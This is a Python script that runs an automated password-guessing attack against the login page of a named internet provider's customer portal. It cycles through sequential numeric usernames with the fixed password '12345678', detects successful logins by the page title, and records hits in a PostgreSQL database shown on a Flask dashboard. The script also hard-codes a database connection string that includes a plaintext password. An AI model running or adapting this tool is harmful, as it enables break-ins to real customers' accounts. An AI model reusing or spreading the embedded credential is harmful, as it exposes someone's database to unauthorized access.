import requests

from bs4 import BeautifulSoup
import logging
import asyncio
from flask import Flask, render_template, jsonify
from flask_sqlalchemy import SQLAlchemy
import threading

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Initialize Flask app and SQLAlchemy
app = Flask(__name__)
# Update the URI to point to your PostgreSQL database
app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://letmesee_user:cstlcNuBuSd1ehLbp8HpkL8r4V2CrrvW@dpg-cr9vq6qj1k6c73bn53gg-a.oregon-postgres.render.com/letmesee'
db = SQLAlchemy(app)

# Define Attempt model
class Attempt(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.Integer, nullable=False)
    status = db.Column(db.String(10), nullable=False)

# Create the database
with app.app_context():
    db.create_all()

# Set the URL of the login form
base_url = "https://selfcare.carnival.com.bd"
url = base_url + "/login.php"

# Set the password to try
password = "12345678"

# Load the last attempted ID
def load_last_id():
    with app.app_context():
        last_attempt = Attempt.query.order_by(Attempt.id.desc()).first()
        if last_attempt:
            return last_attempt.username + 1
        return 100000 # Default starting ID if no records exist

# Save the last attempted ID
def save_last_id(current_id):
    # No file required, last ID is the next username to attempt
    pass

# Function to perform the brute force attack
username = load_last_id()

async def brute_force_attack():
    global username
    while True:
        attempt_message = f"Trying username {username}..."
        print(attempt_message)
        save_last_id(username)  # No action needed, ID is managed by database
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        form = soup.find('form', {'class': 'login'})
        action = form['action']
        data = {'username': str(username), 'password': password}
        response = requests.post(base_url + action, data=data)
        soup = BeautifulSoup(response.content, 'html.parser')

        if soup.find('title').text == 'Carnival::Selfcare Dashboard':
            success_message = f"Login successful with username {username} and password {password}"
            print(success_message)
            new_attempt = Attempt(username=username, status='Success')
        else:
            failure_message = f"Failed to login with username {username} and password {password}"
            print(failure_message)
            new_attempt = Attempt(username=username, status='Failed')

        with app.app_context():
            db.session.add(new_attempt)
            db.session.commit()

        username += 1
        await asyncio.sleep(1)  # Delay to avoid overwhelming the server

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/get_attempts', methods=['GET'])
def get_attempts():
    with app.app_context():
        all_attempts = Attempt.query.all()
        attempts = [{'username': a.username, 'status': a.status} for a in all_attempts]
    return jsonify(attempts)

def run_flask_app():
    app.run(host='0.0.0.0', port=10000)

def main():
    flask_thread = threading.Thread(target=run_flask_app)
    flask_thread.daemon = True
    flask_thread.start()
    asyncio.run(brute_force_attack())

if __name__ == '__main__':
    main()
